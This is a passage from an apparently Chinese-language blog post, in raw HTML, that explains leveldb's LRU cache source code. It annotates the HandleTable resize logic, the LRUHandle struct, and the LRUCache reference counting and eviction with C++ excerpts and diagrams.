class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// The table consists of an array of buckets where each bucket is</span></span><br><span class="line">  <span class="comment">// a linked list of cache entries that hash into the bucket.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length_;<span class="comment">// buckets个数</span></span><br><span class="line">  <span class="keyword">uint32_t</span> elems_;  <span class="comment">// 当前插入的elem个数</span></span><br><span class="line">  LRUHandle** list_;<span class="comment">// 二级指针，每个一级指针指向一个桶</span></span><br></pre></td></tr></table></figure><h3 id="Insert"><a href="#Insert" class="headerlink" title="Insert"></a>Insert</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRUHandle* <span class="title">Insert</span><span class="params">(LRUHandle* h)</span> </span>&#123;</span><br><span class="line">  LRUHandle** ptr = FindPointer(h-&gt;key(), h-&gt;hash);</span><br><span class="line">  LRUHandle* old = *ptr;</span><br><span class="line">  h-&gt;next_hash = (old == <span class="literal">nullptr</span> ? <span class="literal">nullptr</span> : old-&gt;next_hash);</span><br><span class="line">  *ptr = h;<span class="comment">// 替换操作</span></span><br><span class="line">  <span class="keyword">if</span> (old == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    ++elems_;</span><br><span class="line">    <span class="keyword">if</span> (elems_ &gt; length_) &#123;<span class="comment">// 尽可能保证一个bucket只有一个elem</span></span><br><span class="line">      <span class="comment">// Since each cache entry is fairly large, we aim for a small</span></span><br><span class="line">      <span class="comment">// average linked list length (&lt;= 1).</span></span><br><span class="line">      Resize();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> old;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>insert函数首先在当前hashtable中尝试找到与插入key具有相同key的entry，即旧entry。 如果存在旧entry，则将旧的覆盖为新的节点。如果不存在旧的entry，则添加一个新的节点。同时可能需要resize hash， resize的条件为“当前插入的节点数比hashtable 的 bucket数大”，这样做的目的是尽量保证每个bucket下只有一个entry，这样search时间能够保证在O(1)。</p><h3 id="Resize"><a href="#Resize" class="headerlink" title="Resize"></a>Resize</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Resize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">uint32_t</span> new_length = <span class="number">4</span>;<span class="comment">// 保证新容量是4的整数倍</span></span><br><span class="line">   <span class="keyword">while</span> (new_length &lt; elems_) &#123;<span class="comment">// 2倍扩容</span></span><br><span class="line">     new_length *= <span class="number">2</span>;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">// 新hashtable</span></span><br><span class="line">   LRUHandle** new_list = <span class="keyword">new</span> LRUHandle*[new_length];</span><br><span class="line">   <span class="built_in">memset</span>(new_list, <span class="number">0</span>, <span class="keyword">sizeof</span>(new_list[<span class="number">0</span>]) * new_length);</span><br><span class="line">   <span class="keyword">uint32_t</span> count = <span class="number">0</span>;</span><br><span class="line">   <span class="comment">// 移动旧hashtable中的元素到新hashtable</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; length_; i++) &#123;</span><br><span class="line">     LRUHandle* h = list_[i];</span><br><span class="line">     <span class="keyword">while</span> (h != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">       LRUHandle* next = h-&gt;next_hash;</span><br><span class="line">       <span class="keyword">uint32_t</span> hash = h-&gt;hash;</span><br><span class="line"><span class="comment">// 下面3行代码的结果是，如果旧hashtable的一个bucket的多个node，都重新链接到了这个新hashtable的同一个bucket，则这些node将会反序连接</span></span><br><span class="line">       LRUHandle** ptr = &amp;new_list[hash &amp; (new_length - <span class="number">1</span>)];</span><br><span class="line">       h-&gt;next_hash = *ptr;</span><br><span class="line">       *ptr = h;</span><br><span class="line">       h = next;</span><br><span class="line">       count++;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   assert(elems_ == count);</span><br><span class="line">    <span class="comment">// 删除旧表</span></span><br><span class="line">   <span class="keyword">delete</span>[] list_;</span><br><span class="line">   list_ = new_list;</span><br><span class="line">   length_ = new_length;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第 23 页.png" style="zoom:33%;" /><h3 id="Remove"><a href="#Remove" class="headerlink" title="Remove"></a>Remove</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRUHandle* <span class="title">Remove</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">uint32_t</span> hash)</span> </span>&#123;</span><br><span class="line">  LRUHandle** ptr = FindPointer(key, hash);</span><br><span class="line">  LRUHandle* result = *ptr;</span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *ptr = result-&gt;next_hash;<span class="comment">// remove掉当前节点，并指向下一个节点</span></span><br><span class="line">    --elems_;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a pointer to slot that points to a cache entry that</span></span><br><span class="line"><span class="comment">// matches key/hash.  If there is no such cache entry, return a</span></span><br><span class="line"><span class="comment">// pointer to the trailing slot in the corresponding linked list.</span></span><br><span class="line"><span class="function">LRUHandle** <span class="title">FindPointer</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">uint32_t</span> hash)</span> </span>&#123;</span><br><span class="line">  LRUHandle** ptr = &amp;list_[hash &amp; (length_ - <span class="number">1</span>)];<span class="comment">// 二级指针</span></span><br><span class="line">  <span class="keyword">while</span> (*ptr != <span class="literal">nullptr</span> &amp;&amp; ((*ptr)-&gt;hash != hash || key != (*ptr)-&gt;key())) &#123;</span><br><span class="line">    ptr = &amp;(*ptr)-&gt;next_hash;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，这里remove的entry并没有free掉。entry的free在后文的LRUCache中。</p><img data-src="https://pic.downk.cc/item/5f8421811cd1bbb86be7cd0d.png" style="zoom:33%;" /><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>leveldb的hashtable其实就是一个数组+链表的hashtable，只不过rehash操作做了优化，从而加快search的效率。</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第 3 页.png" style="zoom:50%;" /><h2 id="2-LRUHandle"><a href="#2-LRUHandle" class="headerlink" title="2. LRUHandle"></a>2. LRUHandle</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LRUHandle</span> &#123;</span></span><br><span class="line">  <span class="keyword">void</span>* value;</span><br><span class="line">  <span class="keyword">void</span> (*deleter)(<span class="keyword">const</span> Slice&amp;, <span class="keyword">void</span>* value);</span><br><span class="line">  LRUHandle* next_hash;</span><br><span class="line">  LRUHandle* next;<span class="comment">// 双链表的next</span></span><br><span class="line">  LRUHandle* prev;<span class="comment">// 双链表的prev</span></span><br><span class="line">  <span class="keyword">size_t</span> charge;  <span class="comment">// TODO(opt): Only allow uint32_t?</span></span><br><span class="line">  <span class="keyword">size_t</span> key_length;</span><br><span class="line">  <span class="keyword">bool</span> in_cache;     <span class="comment">// Whether entry is in the cache.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> refs;     <span class="comment">// References, including cache reference, if present. 引用计数</span></span><br><span class="line">  <span class="keyword">uint32_t</span> hash;     <span class="comment">// Hash of key(); used for fast sharding and comparisons</span></span><br><span class="line">  <span class="keyword">char</span> key_data[<span class="number">1</span>];  <span class="comment">// Beginning of key, ！！ 占位符，这里放在结构体的最后且只有一个字节是有目的的，后面说到</span></span><br><span class="line"></span><br><span class="line">  <span class="function">Slice <span class="title">key</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// next_ is only equal to this if the LRU handle is the list head of an</span></span><br><span class="line">    <span class="comment">// empty list. List heads never have meaningful keys.</span></span><br><span class="line">    assert(next != <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Slice(key_data, key_length);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>LRUHandle表示一个cache节点。其中next_hash字段用在hashtable中，表明相同bucekt下的下一个节点。</p><h2 id="3-LRUCache"><a href="#3-LRUCache" class="headerlink" title="3. LRUCache"></a>3. LRUCache</h2><h3 id="总layout："><a href="#总layout：" class="headerlink" title="总layout："></a>总layout：</h3><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第 4 页.png" style="zoom:50%;" /><p>HandleTable是用来找到某个cache entry的。但是无法实现LRU算法，现在来说一下实际的LRUCache。在LRUCache的实现里维护了两个链表：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dummy head of LRU list.</span></span><br><span class="line"><span class="comment">// lru.prev is newest entry, lru.next is oldest entry.</span></span><br><span class="line"><span class="comment">// Entries have refs==1 and in_cache==true.</span></span><br><span class="line"><span class="function">LRUHandle lru_ <span class="title">GUARDED_BY</span><span class="params">(mutex_)</span></span>;<span class="comment">// 冷数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Dummy head of in-use list.</span></span><br><span class="line"><span class="comment">// Entries are in use by clients, and have refs &gt;= 2 and in_cache==true.</span></span><br><span class="line"><span class="function">LRUHandle in_use_ <span class="title">GUARDED_BY</span><span class="params">(mutex_)</span></span>;<span class="comment">// 热数据</span></span><br><span class="line"></span><br><span class="line"><span class="function">HandleTable table_ <span class="title">GUARDED_BY</span><span class="params">(mutex_)</span></span>; <span class="comment">// 之前讲过</span></span><br></pre></td></tr></table></figure><p>注意在lru_链表中， lru.prev代表最新entry，lru.next代表最旧entry。</p><p>一个cache entry在上述两条链中的其中一个，通过 Ref() and Unref()调用，一个cache entry在两条链表之间move。</p><h3 id="1-Ref"><a href="#1-Ref" class="headerlink" title="1. Ref"></a>1. Ref</h3><p>Ref将一个cache 节点，从lru_链表插入到in_user_链表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LRUCache::Ref</span><span class="params">(LRUHandle* e)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e-&gt;refs == <span class="number">1</span> &amp;&amp; e-&gt;in_cache) &#123;  <span class="comment">// If on lru_ list, move to in_use_ list.</span></span><br><span class="line">    LRU_Remove(e);</span><br><span class="line">    LRU_Append(&amp;in_use_, e);</span><br><span class="line">  &#125;</span><br><span class="line">  e-&gt;refs++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LRUCache::LRU_Remove</span><span class="params">(LRUHandle* e)</span> </span>&#123;</span><br><span class="line">  e-&gt;next-&gt;prev = e-&gt;prev;</span><br><span class="line">  e-&gt;prev-&gt;next = e-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LRUCache::LRU_Append</span><span class="params">(LRUHandle* <span class="built_in">list</span>, LRUHandle* e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Make "e" newest entry by inserting just before *list</span></span><br><span class="line">  <span class="comment">// 插入到最新位置,list head处</span></span><br><span class="line">  e-&gt;next = <span class="built_in">list</span>;</span><br><span class="line">  e-&gt;prev = <span class="built_in">list</span>-&gt;prev;</span><br><span class="line">  e-&gt;prev-&gt;next = e;</span><br><span class="line">  e-&gt;next-&gt;prev = e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-UnRef"><a href="#2-UnRef" class="headerlink" title="2. UnRef"></a>2. UnRef</h3><p>如果client不再引用一条cache entry， 则会进行UnRef，当一个cache ref=0时，则删除这个entry，当cache ref = 1时，则从热链(in_user_)迁移到冷链(lru_)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LRUCache::Unref</span><span class="params">(LRUHandle* e)</span> </span>&#123;</span><br><span class="line">  assert(e-&gt;refs &gt; <span class="number">0</span>);</span><br><span class="line">  e-&gt;refs--;</span><br><span class="line">  <span class="keyword">if</span> (e-&gt;refs == <span class="number">0</span>) &#123;  <span class="comment">// Deallocate.</span></span><br><span class="line">    assert(!e-&gt;in_cache);</span><br><span class="line">    (*e-&gt;deleter)(e-&gt;key(), e-&gt;value);</span><br><span class="line">    <span class="built_in">free</span>(e);<span class="comment">// 这里free</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e-&gt;in_cache &amp;&amp; e-&gt;refs == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// No longer in use; move to lru_ list.</span></span><br><span class="line">    LRU_Remove(e);</span><br><span class="line">    LRU_Append(&amp;lru_, e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-Insert（evict）"><a href="#3-Insert（evict）" class="headerlink" title="3. Insert（evict）"></a>3. Insert（evict）</h3><p>cache是有容量大小限制的，当插入的cache entry达到一定数量时，需要根据LRU算法剔除旧cache。这部分实现的入口在Insert函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">Cache::Handle* <span class="title">LRUCache::Insert</span><span class="params">(<span class="keyword">const</span> Slice&amp; key, <span class="keyword">uint32_t</span> hash, <span class="keyword">void</span>* value,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">size_t</span> charge,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">void</span> (*deleter)(<span class="keyword">const</span> Slice&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                <span class="keyword">void</span>* value))</span> </span>&#123;</span><br><span class="line">  <span class="function">MutexLock <span class="title">l</span><span class="params">(&amp;mutex_)</span></span>;</span><br><span class="line"></span><br><span class="line">  LRUHandle* e =<span class="comment">// !!! 这里解释了上面为什么申请了一个字节的 key_data并且放在最后</span></span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;LRUHandle*&gt;(<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LRUHandle) - <span class="number">1</span> + key.<span class="built_in">size</span>()));</span><br><span class="line">  e-&gt;value = value;</span><br><span class="line">  e-&gt;deleter = deleter;</span><br><span class="line">  e-&gt;charge = charge;</span><br><span class="line">  e-&gt;key_length = key.<span class="built_in">size</span>();</span><br><span class="line">  e-&gt;hash = hash;</span><br><span class="line">  e-&gt;in_cache = <span class="literal">false</span>;</span><br><span class="line">  e-&gt;refs = <span class="number">1</span>;  <span class="comment">// for the returned handle.</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">memcpy</span>(e-&gt;key_data, key.data(), key.<span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (capacity_ &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    e-&gt;refs++;  <span class="comment">// for the cache's reference.</span></span><br><span class="line">    e-&gt;in_cache = <span class="literal">true</span>;</span><br><span class="line">    LRU_Append(&amp;in_use_, e);</span><br><span class="line">    usage_ += charge;</span><br><span class="line">    FinishErase(table_.Insert(e));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  <span class="comment">// don't cache. (capacity_==0 is supported and turns off caching.)</span></span><br><span class="line">    <span class="comment">// next is read by key() in an assert, so it must be initialized</span></span><br><span class="line">    e-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// ！！！超过容量，需要剔除旧cache lru_.next存放的是最旧的cache entry</span></span><br><span class="line">  <span class="keyword">while</span> (usage_ &gt; capacity_ &amp;&amp; lru_.next != &amp;lru_) &#123;<span class="comment">// 移除旧cache entry，直到当前usage 小于等于 capacity。 或者最旧的entry已经是lru_</span></span><br><span class="line">    LRUHandle* old = lru_.next;</span><br><span class="line">    assert(old-&gt;refs == <span class="number">1</span>);</span><br><span class="line">     <span class="comment">// 从hashtable中移除，从cache中删除。</span></span><br><span class="line">    <span class="keyword">bool</span> erased = FinishErase(table_.Remove(old-&gt;key(), old-&gt;hash));</span><br><span class="line">    <span class="keyword">if</span> (!erased) &#123;  <span class="comment">// to avoid unused variable when compiled NDEBUG</span></span><br><span class="line">      assert(erased);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Cache::Handle*&gt;(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有3个地方需要说明：</p><ol><li><p>LRUHandler中为什么申请了一个字节的key_data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LRUHandle* e =<span class="comment">// !!! 这里解释了上面为什么申请了一个字节的 key_data并且放在最后</span></span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;LRUHandle*&gt;(<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LRUHandle) - <span class="number">1</span> + key.<span class="built_in">size</span>()));</span><br></pre></td></tr></table></figure><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件.png" style="zoom:33%;" /></li><li><p>新增一个cache entry到cache中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (capacity_ &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    e-&gt;refs++;  <span class="comment">// for the cache's reference.</span></span><br><span class="line">    e-&gt;in_cache = <span class="literal">true</span>;</span><br><span class="line">    LRU_Append(&amp;in_use_, e);<span class="comment">// 插入到热链中 in_user_</span></span><br><span class="line">    usage_ += charge;</span><br><span class="line">    FinishErase(table_.Insert(e));<span class="comment">// 如果是更新，需要删除旧entry</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRUHandle* <span class="title">Insert</span><span class="params">(LRUHandle* h)</span> </span>&#123;</span><br><span class="line">  LRUHandle** ptr = FindPointer(h-&gt;key(), h-&gt;hash);</span><br><span class="line">  LRUHandle* old = *ptr;</span><br><span class="line">  h-&gt;next_hash = (old == <span class="literal">nullptr</span> ? <span class="literal">nullptr</span> : old-&gt;next_hash);</span><br><span class="line">  *ptr = h;</span><br><span class="line">  <span class="keyword">if</span> (old == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    ++elems_;</span><br><span class="line">    <span class="keyword">if</span> (elems_ &gt; length_) &#123;</span><br><span class="line">      <span class="comment">// Since each cache entry is fairly large, we aim for a small</span></span><br><span class="line">      <span class="comment">// average linked list length (&lt;= 1).</span></span><br><span class="line">      Resize();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> old;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Insert在Update的情况下，会返回旧的cache entry. 在FinishErase函数调用中决定该cache entry是删除还是移动到lru_链中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If e != nullptr, finish removing *e from the cache; it has already been</span></span><br><span class="line"><span class="comment">// removed from the hash table.  Return whether e != nullptr.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">LRUCache::FinishErase</span><span class="params">(LRUHandle* e)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    assert(e-&gt;in_cache);</span><br><span class="line">    LRU_Remove(e);</span><br><span class="line">    e-&gt;in_cache = <span class="literal">false</span>;</span><br><span class="line">    usage_ -= e-&gt;charge;</span><br><span class="line">    Unref(e);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> e != <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>LRU evict：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// ！！！超过容量，需要剔除旧cache lru_.next存放的是最旧的cache entry</span></span><br><span class="line"><span class="keyword">while</span> (usage_ &gt; capacity_ &amp;&amp; lru_.next != &amp;lru_) &#123;<span class="comment">// 移除旧cache entry，直到当前usage 小于等于 capacity。 或者最旧的entry已经是lru_头，即cache为空</span></span><br><span class="line">  LRUHandle* old = lru_.next;</span><br><span class="line">  assert(old-&gt;refs == <span class="number">1</span>);</span><br><span class="line">   <span class="comment">// 从hashtable中移除，从cache中删除。</span></span><br><span class="line">  <span class="keyword">bool</span> erased = FinishErase(table_.Remove(old-&gt;key(), old-&gt;hash));</span><br><span class="line">  <span class="keyword">if</span> (!erased) &#123;  <span class="comment">// to avoid unused variable when compiled NDEBUG</span></span><br><span class="line">    assert(erased);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>LRU是如何体现的？</p><p>回到插入一个entry到lru_中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LRU_Append(&amp;lru_, e);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LRUCache::LRU_Append</span><span class="params">(LRUHandle* <span class="built_in">list</span>, LRUHandle* e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Make "e" newest entry by inserting just before *list</span></span><br><span class="line">  e-&gt;next = <span class="built_in">list</span>;</span><br><span class="line">  e-&gt;prev = <span class="built_in">list</span>-&gt;prev;</span><br><span class="line">  e-&gt;prev-&gt;next = e;</span><br><span class="line">  e-&gt;next-&gt;prev = e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次插入都是向list head的前面插入一个新节点，作为最新节点。所以有：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcv57uY5Zu+5paH5Lu2LeesrA==" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/绘图文件-第<i class="fa fa-external-link"></i></span> 5 页.png)</p><h2 id="4-ShardedLRUCache"><a href="#4-ShardedLRUCache" class="headerlink" title="4. ShardedLRUCache"></a>4. ShardedLRUCache</h2><p>前面说了ShardedLRUCache是为了减少多线程的竞争延迟而设计的。在SharedLRUCache中有16个LRUCache。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kNumShardBits = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kNumShards = <span class="number">1</span> &lt;&lt; kNumShardBits;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShardedLRUCache</span> :</span> <span class="keyword">public</span> Cache 